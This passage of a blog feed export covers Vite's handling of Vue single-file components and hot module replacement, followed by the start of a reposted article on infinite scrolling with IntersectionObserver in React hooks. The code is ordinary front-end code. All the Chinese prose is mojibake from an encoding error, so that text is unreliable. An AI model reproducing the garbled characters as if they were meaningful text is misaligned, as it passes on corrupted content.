vue-loaderï¼Œä½†æ˜¯å¯¹äºä½¿ç”¨æ–¹æ¥è¯´å¯ä»¥åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œå¯ä»¥åŒæ—¶å†™ templateã€jsã€styleï¼Œçœäº†å„æ–‡ä»¶äº’ç›¸è·³è½¬ã€‚ ä¸ vue-loader ç›¸ä¼¼ï¼Œvite åœ¨è§£æ vue æ–‡ä»¶çš„æ—¶å€™ä¹Ÿè¦åˆ†åˆ«å¤„ç†å¤šæ¬¡ï¼Œæˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨çš„ networkï¼Œå¯ä»¥çœ‹åˆ°ï¼š 1 ä¸ªè¯·æ±‚çš„ query ä¸­ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå¦ 2 ä¸ªè¯·æ±‚åˆ†åˆ«é€šè¿‡åœ¨ query é‡ŒæŒ‡å®šäº† type ä¸º style å’Œ templateã€‚ å…ˆæ¥çœ‹çœ‹å¦‚ä½•å°†ä¸€ä¸ª SFC å˜æˆå¤šä¸ªè¯·æ±‚ï¼Œæˆ‘ä»¬ä»ç¬¬ä¸€æ¬¡è¯·æ±‚å¼€å§‹åˆ†æï¼Œç®€åŒ–åçš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728function vuePlugin(&#123;app&#125;)&#123; app.use(async (ctx, next) =&gt; &#123; if (!ctx.path.endsWith(&apos;.vue&apos;) &amp;&amp; !ctx.vue) &#123; return next() &#125; const query = ctx.query // è·å–æ–‡ä»¶åç§° let filename = resolver.requestToFile(publicPath) // è§£æå™¨è§£æ SFC const descriptor = await parseSFC(root, filename, ctx.body) if (!descriptor) &#123; ctx.status = 404 return &#125; // ç¬¬ä¸€æ¬¡è¯·æ±‚ .vue if (!query.type) &#123; if (descriptor.script &amp;&amp; descriptor.script.src) &#123; filename = await resolveSrcImport(descriptor.script, ctx, resolver) &#125; ctx.type = &apos;js&apos; // body è¿”å›è§£æåçš„ä»£ç  ctx.body = await compileSFCMain(descriptor, filename, publicPath) &#125; // ...&#125; åœ¨ compileSFCMain ä¸­æ˜¯ä¸€æ®µé•¿é•¿çš„ generate ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031function compileSFCMain(descriptor, filePath: string, publicPath: string) &#123; let code = &apos;&apos; if (descriptor.script) &#123; let content = descriptor.script.content code += content.replace(`export default`, &apos;const __script =&apos;) &#125; else &#123; code += `const __script = &#123;&#125;` &#125; if (descriptor.styles) &#123; code += `\nimport &#123; updateStyle &#125; from &quot;$&#123;hmrClientId&#125;&quot;\n` descriptor.styles.forEach((s, i) =&gt; &#123; const styleRequest = publicPath + `?type=style&amp;index=$&#123;i&#125;` code += `\nupdateStyle(&quot;$&#123;id&#125;-$&#123;i&#125;&quot;, $&#123;JSON.stringify(styleRequest)&#125;)` &#125;) if (hasScoped) &#123; code += `\n__script.__scopeId = &quot;data-v-$&#123;id&#125;&quot;` &#125; &#125; if (descriptor.template) &#123; code += `\nimport &#123; render as __render &#125; from $&#123;JSON.stringify( publicPath + `?type=template` )&#125;` code += `\n__script.render = __render` &#125; code += `\n__script.__hmrId = $&#123;JSON.stringify(publicPath)&#125;` code += `\n__script.__file = $&#123;JSON.stringify(filePath)&#125;` code += `\nexport default __script` return code&#125; ç›´æ¥çœ‹ generate åçš„ä»£ç ï¼š 12345678import &#123; updateStyle &#125; from &quot;/vite/hmr&quot;updateStyle(&quot;c44b8200-0&quot;, &quot;/App.vue?type=style&amp;index=0&quot;)__script.__scopeId = &quot;data-v-c44b8200&quot;import &#123; render as __render &#125; from &quot;/App.vue?type=template&quot;__script.render = __render__script.__hmrId = &quot;/App.vue&quot;__script.__file = &quot;/Users/muou/work/playground/vite-app/App.vue&quot;export default __script å‡ºç°äº† vite/hmr çš„å¯¼å…¥ï¼Œvite/hmr å…·ä½“å†…å®¹æˆ‘ä»¬ä¸‹æ–‡å†åˆ†æï¼Œä»è¿™æ®µä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº style vite ä½¿ç”¨ updateStyle è¿™ä¸ªæ–¹æ³•å¤„ç†ï¼ŒupdateStyle å†…å®¹éå¸¸ç®€å•ï¼Œè¿™é‡Œå°±ä¸è´´ä»£ç äº†ï¼Œå°±åšäº† 1 ä»¶äº‹ï¼šé€šè¿‡åˆ›å»º style å…ƒç´ ï¼Œè®¾ç½®äº†å®ƒçš„ innerHtml ä¸º css å†…å®¹ã€‚ è¿™ä¸¤ç§æ–¹å¼éƒ½ä¼šä½¿å¾—æµè§ˆå™¨å‘èµ· http è¯·æ±‚ï¼Œè¿™æ ·å°±èƒ½è¢« koa ä¸­é—´ä»¶æ•è·åˆ°äº†ï¼Œæ‰€ä»¥å°±å½¢æˆäº†ä¸Šæ–‡æˆ‘ä»¬çœ‹åˆ°çš„ï¼šå¯¹ä¸€ä¸ª .vue æ–‡ä»¶å¤„ç†ä¸‰æ¬¡çš„æƒ…æ™¯ã€‚ è¿™éƒ¨åˆ†ä»£ç åœ¨ï¼šserverPluginVue è¿™ä¸ª plugin é‡Œã€‚ css**** å¦‚æœåœ¨ vite é¡¹ç›®é‡Œå¼•å…¥ä¸€ä¸ª sass æ–‡ä»¶ä¼šæ€ä¹ˆæ ·ï¼Ÿ æœ€åˆ vite åªæ˜¯ä¸º vue é¡¹ç›®å¼€å‘ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¯¹ css é¢„ç¼–è¯‘çš„æ”¯æŒï¼Œä¸è¿‡éšç€åç»­çš„å‡ æ¬¡å¤§æ›´æ–°ï¼Œåœ¨ vite é¡¹ç›®é‡Œä½¿ç”¨ sass/less ç­‰ä¹Ÿå¯ä»¥è·Ÿä½¿ç”¨ webpack çš„æ—¶å€™ä¸€æ ·ä¼˜é›…äº†ï¼Œåªéœ€è¦å®‰è£…å¯¹åº”çš„ css é¢„å¤„ç†å™¨å³å¯ã€‚ åœ¨ cssPlugin ä¸­ï¼Œé€šè¿‡æ­£åˆ™ï¼š/(.+).(less|sass|scss|styl|stylus)$/ åˆ¤æ–­è·¯å¾„æ˜¯å¦éœ€è¦ css é¢„ç¼–è¯‘ï¼Œå¦‚æœå‘½ä¸­æ­£åˆ™ï¼Œå°±å€ŸåŠ© cssUtils é‡Œçš„æ–¹æ³•å€ŸåŠ© postcss å¯¹è¦å¯¼å…¥çš„ css æ–‡ä»¶ç¼–è¯‘ã€‚ vite çƒ­æ›´æ–°çš„å®ç° ä¸Šæ–‡ä¸­å‡ºç°äº† vite/hmr ï¼Œè¿™å°±æ˜¯ vite å¤„ç†çƒ­æ›´æ–°çš„å…³é”®ï¼Œåœ¨ serverPluginHmr plugin ä¸­ï¼Œå¯¹äº path ç­‰äº vite/hmr åšäº†ä¸€æ¬¡åˆ¤æ–­ï¼š 1234567app.use(async (ctx, next) =&gt; &#123; if (ctx.path === &apos;/vite/hmr&apos;) &#123; ctx.type = &apos;js&apos; ctx.status = 200 ctx.body = hmrClient &#125;&#125; hmrClient æ˜¯ vite çƒ­æ›´æ–°çš„å®¢æˆ·ç«¯ä»£ç ï¼Œéœ€è¦åœ¨æµè§ˆå™¨é‡Œæ‰§è¡Œï¼Œè¿™é‡Œå…ˆæ¥è¯´è¯´é€šç”¨çš„çƒ­æ›´æ–°å®ç°ï¼Œçƒ­æ›´æ–°ä¸€èˆ¬éœ€è¦å››ä¸ªéƒ¨åˆ†ï¼š é¦–å…ˆéœ€è¦ web æ¡†æ¶æ”¯æŒæ¨¡å—çš„ rerender/reload é€šè¿‡ watcher ç›‘å¬æ–‡ä»¶æ”¹åŠ¨ é€šè¿‡ server ç«¯ç¼–è¯‘èµ„æºï¼Œå¹¶æ¨é€æ–°æ¨¡å—å†…å®¹ç»™ client ã€‚ client æ”¶åˆ°æ–°çš„æ¨¡å—å†…å®¹ï¼Œæ‰§è¡Œ rerender/reload vite ä¹Ÿä¸ä¾‹å¤–åŒæ ·æœ‰è¿™å››ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­å®¢æˆ·ç«¯ä»£ç åœ¨ï¼šclient.ts é‡Œï¼ŒæœåŠ¡ç«¯ä»£ç åœ¨ serverPluginHmr é‡Œï¼Œå¯¹äº vue ç»„ä»¶çš„æ›´æ–°ï¼Œé€šè¿‡ vue3.x ä¸­çš„ HMRRuntime å¤„ç†çš„ã€‚ client ç«¯**** åœ¨ client ç«¯ï¼Œ WebSocket ç›‘å¬äº†ä¸€äº›æ›´æ–°çš„ç±»å‹ï¼Œç„¶ååˆ†åˆ«å¤„ç†ï¼Œå®ƒä»¬æ˜¯ï¼š vue-reload â€”â€” vue ç»„ä»¶æ›´æ–°ï¼šé€šè¿‡ import å¯¼å…¥æ–°çš„ vue ç»„ä»¶ï¼Œç„¶åæ‰§è¡Œ HMRRuntime.reload vue-rerender â€”â€” vue template æ›´æ–°ï¼šé€šè¿‡ import å¯¼å…¥æ–°çš„ template ï¼Œç„¶åæ‰§è¡Œ HMRRuntime.rerender vue-style-update â€”â€” vue style æ›´æ–°ï¼šç›´æ¥æ’å…¥æ–°çš„ stylesheet style-update â€”â€” css æ›´æ–°ï¼šdocument æ’å…¥æ–°çš„ stylesheet style-remove â€”â€” css ç§»é™¤ï¼šdocument åˆ é™¤ stylesheet js-update â€”â€” js æ›´æ–°ï¼šç›´æ¥æ‰§è¡Œ full-reload â€”â€” é¡µé¢ roloadï¼šä½¿ç”¨ window.reload åˆ·æ–°é¡µé¢ ** **server ç«¯**** åœ¨ server ç«¯ï¼Œé€šè¿‡ watcher ç›‘å¬é¡µé¢æ”¹åŠ¨ï¼Œæ ¹æ®æ–‡ä»¶ç±»å‹åˆ¤æ–­æ˜¯ js Reload è¿˜æ˜¯ Vue Reloadï¼š 12345678910111213watcher.on(&apos;change&apos;, async (file) =&gt; &#123; const timestamp = Date.now() if (file.endsWith(&apos;.vue&apos;)) &#123; handleVueReload(file, timestamp) &#125; else if ( file.endsWith(&apos;.module.css&apos;) || !(file.endsWith(&apos;.css&apos;) || cssTransforms.some((t) =&gt; t.test(file, &#123;&#125;))) ) &#123; // everything except plain .css are considered HMR dependencies. // plain css has its own HMR logic in ./serverPluginCss.ts. handleJSReload(file, timestamp) &#125; &#125;) åœ¨ handleVueReload æ–¹æ³•é‡Œï¼Œä¼šä½¿ç”¨è§£æå™¨æ‹¿åˆ°å½“å‰æ–‡ä»¶çš„ template/script/style ï¼Œå¹¶ä¸”ä¸ç¼“å­˜é‡Œçš„ä¸Šä¸€æ¬¡è§£æçš„ç»“æœè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœ template å‘ç”Ÿæ”¹å˜å°±æ‰§è¡Œ vue-rerenderï¼Œå¦‚æœ style å‘ç”Ÿæ”¹å˜å°±æ‰§è¡Œ vue-style-updateï¼Œç®€åŒ–åçš„é€»è¾‘å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041async function handleVueReload( file timestamp, content ) &#123; // è·å–ç¼“å­˜ const cacheEntry = vueCache.get(fileï¼‰ // è§£æ vue æ–‡ä»¶ const descriptor = await parseSFC(root, file, content) if (!descriptor) &#123; // read failed return &#125; // æ‹¿åˆ°ä¸Šä¸€æ¬¡è§£æç»“æœ const prevDescriptor = cacheEntry &amp;&amp; cacheEntry.descriptor // è®¾ç½®åˆ·æ–°å˜é‡ let needReload = false // script æ”¹å˜æ ‡è®° let needCssModuleReload = false // css æ”¹å˜æ ‡è®° let needRerender = false // template æ”¹å˜æ ‡è®° // åˆ¤æ–­ script æ˜¯å¦ç›¸åŒ if (!isEqual(descriptor.script, prevDescriptor.script)) &#123; needReload = true &#125; // åˆ¤æ–­ template æ˜¯å¦ç›¸åŒ if (!isEqual(descriptor.template, prevDescriptor.template)) &#123; needRerender = true &#125; // é€šè¿‡ send å‘é€ socket if (needRerender)&#123; send(&#123; type: &apos;vue-rerender&apos;, path: publicPath, timestamp &#125;) &#125; &#125; handleJSReload æ–¹æ³•åˆ™æ˜¯æ ¹æ®æ–‡ä»¶è·¯å¾„å¼•ç”¨ï¼Œåˆ¤æ–­è¢«å“ªä¸ª vue ç»„ä»¶æ‰€ä¾èµ–ï¼Œå¦‚æœæœªæ‰¾åˆ° vue ç»„ä»¶ä¾èµ–ï¼Œåˆ™åˆ¤æ–­é¡µé¢éœ€è¦åˆ·æ–°ï¼Œå¦åˆ™èµ°ç»„ä»¶æ›´æ–°é€»è¾‘ï¼Œè¿™é‡Œå°±ä¸è´´ä»£ç äº†ã€‚ æ•´ä½“ä»£ç åœ¨ client.ts å’Œ serverPluginHmr.ts é‡Œã€‚ NO.5 ç»“è¯­ æœ¬æ–‡åˆ†æäº† vite çš„å¯åŠ¨é“¾è·¯ä»¥åŠèƒŒåçš„éƒ¨åˆ†åŸç†ï¼Œè™½ç„¶åœ¨çŸ­æ—¶é—´å†… vite ä¸ä¼šæ›¿ä»£ webpackï¼Œä½†æ˜¯èƒ½å¤Ÿçœ‹åˆ°ç¤¾åŒºä¸­å¤šäº†ä¸€ç§æ–¹æ¡ˆè¿˜æ˜¯å¾ˆå…´å¥‹çš„ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å†™ä¸‹è¿™ç¯‡æ–‡ç« çš„åŸå› ã€‚ vite æ›´æ–°çš„å®åœ¨å¤ªå¿«äº†ï¼Œä½©æœå°¤å¤§çš„å‹¤å¥‹å’Œå¼€æºç²¾ç¥ï¼ŒçŸ­çŸ­ä¸€ä¸ªæœˆå°±åŠ å…¥äº†è¯¸å¦‚ css é¢„ç¼–è¯‘/reactæ”¯æŒ/é€šç”¨ hmr çš„æ”¯æŒï¼Œç”±äºç¯‡å¹…æœ‰é™æœ¬æ–‡ä¸å†ä¸€ä¸€ä»‹ç»è¿™äº›æ–°ç‰¹æ€§ï¼Œè¿™äº›æ–°çš„ç‰¹æ€§ç­‰å¾…è¯»è€…æœ‹å‹ä»¬è‡ªè¡Œå»æ¢è®¨äº†ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[90è¡Œä»£ç ï¼Œ15ä¸ªå…ƒç´ å®ç°æ— é™æ»šåŠ¨]]></title>
    <url>%2F2020%2F08%2F26%2FWeb%E5%89%8D%E7%AB%AF%2F90%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%8C15%E4%B8%AA%E5%85%83%E7%B4%A0%E5%AE%9E%E7%8E%B0%E6%97%A0%E9%99%90%E6%BB%9A%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªè…¾è®¯äº‘ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://cloud.tencent.com/developer/article/1509379 å‰è¨€ åœ¨æœ¬ç¯‡æ–‡ç« ä½ å°†ä¼šå­¦åˆ°ï¼š IntersectionObserver API çš„ç”¨æ³•ï¼Œä»¥åŠå¦‚ä½•å…¼å®¹ã€‚ å¦‚ä½•åœ¨React Hookä¸­å®ç°æ— é™æ»šåŠ¨ã€‚ å¦‚ä½•æ­£ç¡®æ¸²æŸ“å¤šè¾¾10000ä¸ªå…ƒç´ çš„åˆ—è¡¨ã€‚ æ— é™ä¸‹æ‹‰åŠ è½½æŠ€æœ¯ä½¿ç”¨æˆ·åœ¨å¤§é‡æˆå—çš„å†…å®¹é¢å‰ä¸€ç›´æ»šåŠ¨æŸ¥çœ‹ã€‚è¿™ç§æ–¹æ³•æ˜¯åœ¨ä½ å‘ä¸‹æ»šåŠ¨çš„æ—¶å€™ä¸æ–­åŠ è½½æ–°å†…å®¹ã€‚ å½“ä½ ä½¿ç”¨æ»šåŠ¨ä½œä¸ºå‘ç°æ•°æ®çš„ä¸»è¦æ–¹æ³•æ—¶ï¼Œå®ƒå¯èƒ½ä½¿ä½ çš„ç”¨æˆ·åœ¨ç½‘é¡µä¸Šåœç•™æ›´é•¿æ—¶é—´å¹¶æå‡ç”¨æˆ·å‚ä¸åº¦ã€‚ éšç€ç¤¾äº¤åª’ä½“çš„æµè¡Œï¼Œå¤§é‡çš„æ•°æ®è¢«ç”¨æˆ·æ¶ˆè´¹ã€‚æ— çº¿æ»šåŠ¨æä¾›äº†ä¸€ä¸ªé«˜æ•ˆçš„æ–¹æ³•è®©ç”¨æˆ·æµè§ˆæµ·é‡ä¿¡æ¯ï¼Œè€Œä¸å¿…ç­‰å¾…é¡µé¢çš„é¢„åŠ è½½ã€‚ å¦‚ä½•æ„å»ºä¸€ä¸ªä½“éªŒè‰¯å¥½çš„æ— é™æ»šåŠ¨ï¼Œæ˜¯æ¯ä¸ªå‰ç«¯æ— è®ºæ˜¯é¡¹ç›®æˆ–é¢è¯•éƒ½ä¼šç¢°åˆ°çš„ä¸€ä¸ªè¯¾é¢˜ã€‚ æœ¬æ–‡çš„åŸç‰ˆå®ç°æ¥è‡ªï¼šCreating Infinite Scroll with 15 Elements 1. æ—©æœŸçš„è§£å†³æ–¹æ¡ˆå…³äºæ— é™æ»šåŠ¨ï¼Œæ—©æœŸçš„è§£å†³æ–¹æ¡ˆåŸºæœ¬éƒ½æ˜¯ä¾èµ–ç›‘å¬scrolläº‹ä»¶ï¼š 12345function fetchData() &#123; fetch(path).then(res =&gt; doSomeThing(res.data));&#125;window.addEventListener('scroll', fetchData); ç„¶åè®¡ç®—å„ç§.scrollTop()ã€.offset().topç­‰ç­‰ã€‚ æ‰‹å†™ä¸€ä¸ªä¹Ÿæ˜¯éå¸¸æ¯ç‡¥ã€‚è€Œä¸”ï¼š scrolläº‹ä»¶ä¼šé¢‘ç¹è§¦å‘ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨èŠ‚æµã€‚ æ»šåŠ¨å…ƒç´ å†…æœ‰å¤§é‡DOMï¼Œå®¹æ˜“é€ æˆå¡é¡¿ã€‚ åæ¥å‡ºç°äº¤å‰è§‚å¯Ÿè€…IntersectionObserver API ï¼Œåœ¨ä¸Vueã€Reactè¿™ç±»æ•°æ®é©±åŠ¨è§†å›¾çš„æ¡†æ¶åï¼Œæ— é™æ»šåŠ¨çš„é€šç”¨æ–¹æ¡ˆå°±å‡ºæ¥äº†ã€‚ 2. äº¤å‰è§‚å¯Ÿè€…ï¼šIntersectionObserver123456789const box = document.querySelector('.box');const intersectionObserver = new IntersectionObserver((entries) =&gt; &#123; entries.forEach((item) =&gt; &#123; if (item.isIntersecting) &#123; console.log('è¿›å…¥å¯è§†åŒºåŸŸ'); &#125; &#125;)&#125;);intersectionObserver.observe(box); æ•²é‡ç‚¹ï¼š IntersectionObserver APIæ˜¯å¼‚æ­¥çš„ï¼Œä¸éšç€ç›®æ ‡å…ƒç´ çš„æ»šåŠ¨åŒæ­¥è§¦å‘ï¼Œæ€§èƒ½æ¶ˆè€—æä½ã€‚ 2.1 IntersectionObserverEntryå¯¹è±¡ è¿™é‡Œæˆ‘å°±ç²—ç•¥çš„ä»‹ç»ä¸‹éœ€è¦ç”¨åˆ°çš„ï¼š IntersectionObserverEntryå¯¹è±¡ callbackå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šä¼ ç»™å®ƒä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„é‡Œçš„æ¯ä¸ªå¯¹è±¡å°±æ˜¯å½“å‰è¿›å…¥å¯è§†åŒºåŸŸæˆ–è€…ç¦»å¼€å¯è§†åŒºåŸŸçš„å¯¹è±¡(IntersectionObserverEntryå¯¹è±¡) è¿™ä¸ªå¯¹è±¡æœ‰å¾ˆå¤šå±æ€§ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„å±æ€§æ˜¯ï¼š target: è¢«è§‚å¯Ÿçš„ç›®æ ‡å…ƒç´ ï¼Œæ˜¯ä¸€ä¸ª DOM èŠ‚ç‚¹å¯¹è±¡ isIntersecting: æ˜¯å¦è¿›å…¥å¯è§†åŒºåŸŸ intersectionRatio: ç›¸äº¤åŒºåŸŸå’Œç›®æ ‡å…ƒç´ çš„æ¯”ä¾‹å€¼ï¼Œè¿›å…¥å¯è§†åŒºåŸŸï¼Œå€¼å¤§äº0ï¼Œå¦åˆ™ç­‰äº0 2.3 optionsè°ƒç”¨IntersectionObserveræ—¶ï¼Œé™¤äº†ä¼ ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè¿˜å¯ä»¥ä¼ å…¥ä¸€ä¸ªoptionå¯¹è±¡ï¼Œé…ç½®å¦‚ä¸‹å±æ€§ï¼š threshold: å†³å®šäº†ä»€ä¹ˆæ—¶å€™è§¦å‘å›è°ƒå‡½æ•°ã€‚å®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ªé—¨æ§›å€¼ï¼Œé»˜è®¤ä¸º[0]ï¼Œå³äº¤å‰æ¯”ä¾‹ï¼ˆintersectionRatioï¼‰è¾¾åˆ°0æ—¶è§¦å‘å›è°ƒå‡½æ•°ã€‚ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰è¿™ä¸ªæ•°ç»„ã€‚æ¯”å¦‚ï¼Œ[0, 0.25, 0.5, 0.75, 1]å°±è¡¨ç¤ºå½“ç›®æ ‡å…ƒç´  0%ã€25%ã€50%ã€75%ã€100% å¯è§æ—¶ï¼Œä¼šè§¦å‘å›è°ƒå‡½æ•°ã€‚ root: ç”¨äºè§‚å¯Ÿçš„æ ¹å…ƒç´ ï¼Œé»˜è®¤æ˜¯æµè§ˆå™¨çš„è§†å£ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…·ä½“å…ƒç´ ï¼ŒæŒ‡å®šå…ƒç´ çš„æ—¶å€™ç”¨äºè§‚å¯Ÿçš„å…ƒç´ å¿…é¡»æ˜¯æŒ‡å®šå…ƒç´ çš„å­å…ƒç´  rootMargin: ç”¨æ¥æ‰©å¤§æˆ–è€…ç¼©å°è§†çª—çš„çš„å¤§å°ï¼Œä½¿ç”¨cssçš„å®šä¹‰æ–¹æ³•ï¼Œ10px 10px 30px 20pxè¡¨ç¤ºtopã€rightã€bottom å’Œ leftçš„å€¼ 1234567const io = new IntersectionObserver((entries) =&gt; &#123; console.log(entries);&#125;, &#123; threshold: [0, 0.5], root: document.querySelector('.container'), rootMargin: "10px 10px 30px 20px",&#125;); 2.4 observer1234observer.observerï¼ˆnodeoneï¼‰; //ä»…è§‚å¯ŸnodeOne observer.observerï¼ˆnodeTwoï¼‰; //è§‚å¯ŸnodeOneå’ŒnodeTwo observer.unobserveï¼ˆnodeOneï¼‰; //åœæ­¢è§‚å¯ŸnodeOneobserver.disconnectï¼ˆï¼‰; //æ²¡æœ‰è§‚å¯Ÿä»»ä½•èŠ‚ç‚¹ 3. å¦‚ä½•åœ¨React Hookä¸­ä½¿ç”¨IntersectionObserveråœ¨çœ‹Hooksç‰ˆä¹‹å‰ï¼Œæ¥çœ‹æ­£å¸¸ç»„ä»¶ç‰ˆçš„ï¼š 1234567891011121314151617181920class SlidingWindowScroll extends React.Component &#123;this.$bottomElement = React.createRef();...componentDidMount() &#123; this.intiateScrollObserver();&#125;intiateScrollObserver = () =&gt; &#123; const options = &#123; root: null, rootMargin: '0px', threshold: 0.1 &#125;; this.observer = new IntersectionObserver(this.callback, options); this.observer.observe(this.$bottomElement.current);&#125;render() &#123; return ( &lt;li className='img' ref=&#123;this.$bottomElement&#125;&gt; )&#125; ä¼—æ‰€å‘¨çŸ¥ï¼ŒReact 16.xåæ¨å‡ºäº†useRefæ¥æ›¿ä»£åŸæœ‰çš„createRefï¼Œç”¨äºè¿½è¸ªDOMèŠ‚ç‚¹ã€‚é‚£è®©æˆ‘ä»¬å¼€å§‹å§ï¼š 4. åŸç†å®ç°ä¸€ä¸ªç»„ä»¶ï¼Œå¯ä»¥æ˜¾ç¤ºå…·æœ‰15ä¸ªå…ƒç´ çš„å›ºå®šçª—å£å¤§å°çš„nä¸ªé¡¹ç›®çš„åˆ—è¡¨ï¼š å³åœ¨ä»»ä½•æ—¶å€™ï¼Œæ— é™æ»šåŠ¨nå…ƒç´ ä¸Šä¹Ÿä»…å­˜åœ¨15ä¸ªDOMèŠ‚ç‚¹ã€‚ é‡‡ç”¨relative/absolute å®šä½æ¥ç¡®å®šæ»šåŠ¨ä½ç½® è¿½è¸ªä¸¤ä¸ªref: top/bottomæ¥å†³å®šå‘ä¸Š/å‘ä¸‹æ»šåŠ¨çš„æ¸²æŸ“ä¸å¦ åˆ‡å‰²æ•°æ®åˆ—è¡¨ï¼Œä¿ç•™æœ€å¤š15ä¸ªDOMå…ƒç´ ã€‚ 5. useState å£°æ˜çŠ¶æ€å˜é‡æˆ‘ä»¬å¼€å§‹ç¼–å†™ç»„ä»¶SlidingWindowScrollHook: 1234567const THRESHOLD = 15;const SlidingWindowScrollHook = (props) =&gt; &#123; const [start, setStart] = useState(0); const [end, setEnd] = useState(THRESHOLD); const [observer, setObserver] = useState(null); // å…¶å®ƒä»£ç ...&#125; 1. useState çš„ç®€å•ç†è§£:1const [å±æ€§, æ“ä½œå±æ€§çš„æ–¹æ³•] = useState(é»˜è®¤å€¼); 2. å˜é‡è§£æ startï¼šå½“å‰æ¸²æŸ“çš„åˆ—è¡¨ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œé»˜è®¤ä¸º0 end: å½“å‰æ¸²æŸ“çš„åˆ—è¡¨æœ€åä¸€ä¸ªæ•°æ®ï¼Œé»˜è®¤ä¸º15 observer: å½“å‰è§‚å¯Ÿçš„è§†å›¾refå…ƒç´  6. useRef å®šä¹‰è¿½è¸ªçš„DOM å…ƒç´ 12const $bottomElement = useRef();const $topElement = useRef(); æ­£å¸¸çš„æ— é™å‘ä¸‹æ»šåŠ¨åªéœ€å…³æ³¨ä¸€ä¸ªdomå…ƒç´ ï¼Œä½†ç”±äºæˆ‘ä»¬æ˜¯å›ºå®š15ä¸ªdomå…ƒç´ æ¸²æŸ“ï¼Œéœ€è¦åˆ¤æ–­å‘ä¸Šæˆ–å‘ä¸‹æ»šåŠ¨ã€‚ 7. å†…éƒ¨æ“ä½œæ–¹æ³•å’Œå’Œå¯¹åº”useEffectè¯·é…åˆæ³¨é‡Šé£Ÿç”¨ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465useEffect(() =&gt; &#123; // å®šä¹‰è§‚å¯Ÿ intiateScrollObserver(); return () =&gt; &#123; // æ”¾å¼ƒè§‚å¯Ÿ resetObservation() &#125;&#125;,[end]) //å› ä¸º[end] æ˜¯åŒæ­¥åˆ·æ–°ï¼Œè¿™é‡Œç”¨ä¸€ä¸ªå°±è¡Œäº†ã€‚// å®šä¹‰è§‚å¯Ÿconst intiateScrollObserver = () =&gt; &#123; const options = &#123; root: null, rootMargin: '0px', threshold: 0.1 &#125;; const Observer = new IntersectionObserver(callback, options) // åˆ†åˆ«è§‚å¯Ÿå¼€å¤´å’Œç»“å°¾çš„å…ƒç´  if ($topElement.current) &#123; Observer.observe($topElement.current); &#125; if ($bottomElement.current) &#123; Observer.observe($bottomElement.current); &#125; // è®¾åˆå§‹å€¼ setObserver(Observer) &#125;// äº¤å‰è§‚å¯Ÿçš„å…·ä½“å›è°ƒï¼Œè§‚å¯Ÿæ¯ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å¯¹å®æ—¶å¤´å°¾å…ƒç´ ç´¢å¼•å¤„ç†const callback = (entries, observer) =&gt; &#123; entries.forEach((entry, index) =&gt; &#123; const listLength = props.list.length; // å‘ä¸‹æ»šåŠ¨ï¼Œåˆ·æ–°æ•°æ® if (entry.isIntersecting &amp;&amp; entry.target.id === "bottom") &#123; const maxStartIndex = listLength - 1 - THRESHOLD; // å½“å‰å¤´éƒ¨çš„ç´¢å¼• const maxEndIndex = listLength - 1; // å½“å‰å°¾éƒ¨çš„ç´¢å¼• const newEnd = (end + 10) &lt;= maxEndIndex ? end + 10 : maxEndIndex; // ä¸‹ä¸€è½®å¢åŠ å°¾éƒ¨ const newStart = (end - 5) &lt;= maxStartIndex ? end - 5 : maxStartIndex; // åœ¨ä¸Šä¸€è½®çš„åŸºç¡€ä¸Šè®¡ç®—å¤´éƒ¨ setStart(newStart) setEnd(newEnd) &#125; // å‘ä¸Šæ»šåŠ¨ï¼Œåˆ·æ–°æ•°æ® if (entry.isIntersecting &amp;&amp; entry.target.id === "top") &#123; const newEnd = end === THRESHOLD ? THRESHOLD : (end - 10 &gt; THRESHOLD ? end - 10 : THRESHOLD); // å‘ä¸Šæ»šåŠ¨å°¾éƒ¨å…ƒç´ ç´¢å¼•ä¸å¾—å°äº15 let newStart = start === 0 ? 0 : (start - 10 &gt; 0 ? start - 10 : 0); // å¤´éƒ¨å…ƒç´ ç´¢å¼•æœ€å°å€¼ä¸º0 setStart(newStart) setEnd(newEnd) &#125; &#125;);&#125;// åœæ­¢æ»šåŠ¨æ—¶æ”¾å¼ƒè§‚å¯Ÿconst resetObservation = () =&gt; &#123; observer &amp;&amp; observer.unobserve($bottomElement.current); observer &amp;&amp; observer.unobserve($topElement.current);&#125;// æ¸²æŸ“æ—¶ï¼Œå¤´å°¾refå¤„ç†const getReference = (index, isLastIndex) =&gt; &#123; if (index === 0) return $topElement; if (isLastIndex) return $bottomElement; return null;&#125; 8. æ¸²æŸ“ç•Œé¢1234567891011121314const &#123;list, height&#125; = props; // æ•°æ®ï¼ŒèŠ‚ç‚¹é«˜åº¦const updatedList = list.slice(start, end); // æ•°æ®åˆ‡å‰²const lastIndex = updatedList.length - 1;return ( &lt;ul style=&#123;&#123;position: 'relative'&#125;&#125;&gt; &#123;updatedList.map((item, index) =&gt; &#123; const top = (height * (index + start)) + 'px'; // åŸºäºç›¸å¯¹ 